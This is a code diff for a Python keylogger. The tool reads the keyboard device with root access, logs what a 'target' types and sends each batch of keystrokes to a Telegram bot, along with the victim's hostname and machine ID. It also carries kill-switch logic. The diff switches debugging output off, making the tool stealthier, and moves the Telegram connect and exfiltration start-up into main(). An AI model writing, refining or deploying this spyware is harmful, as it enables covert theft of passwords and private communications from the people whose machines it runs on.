@@ -14,7 +14,7 @@ from telegramUtils import getLastMsg
 from telegramUtils import syncWithLatestUpdate
 
 wantSHIFT = 0       #do you want in the logs [SHIFT] when target press shift    (1/0)
-debugging = 1       #get extra comments                                         (1/0)
+debugging = 0       #get extra comments                                         (1/0)
 enableLocalKillSwitch = 1                                                     # (1/0)
 threshold = 20      #how many keys after sendinf the text to the telegram bot   (int)
 pathKiller = "/tmp/killSwitch.sh"
@@ -192,6 +192,8 @@ def chechRemoteKillSwitch():
 # MAIN
 
 def main():
+    global log_buffer
+    
     #check for root
     if os.geteuid() != 0:
         if debugging:
@@ -206,6 +208,15 @@ def main():
             print(f"[!]Error: {e}", file=sys.stderr)
         sys.exit(1)
     
+    #start telegram bot
+    initChatID()
+    syncWithLatestUpdate()
+
+    # starting messages
+    log_buffer.append("CONNECTED\nhostname: " + str(hostname) + ",\nmachine_id: " + str(machine_id) + "\nTEXT:\n")
+    sendFromBuffer(log_buffer)
+    log_buffer=[]
+
     fd1 = OpenDevice(kbd_path)
     fd2 = OpenDevice(kbd_path)
 
@@ -231,13 +242,4 @@ def main():
 
 
 if __name__ == '__main__':
-    #start telegram bot
-    initChatID()
-    syncWithLatestUpdate()
-
-    # starting messages
-    log_buffer.append("CONNECTED\nhostname: " + str(hostname) + ",\nmachine_id: " + str(machine_id) + "\nTEXT:\n")
-    sendFromBuffer(log_buffer)
-    log_buffer=[]
-
     main()
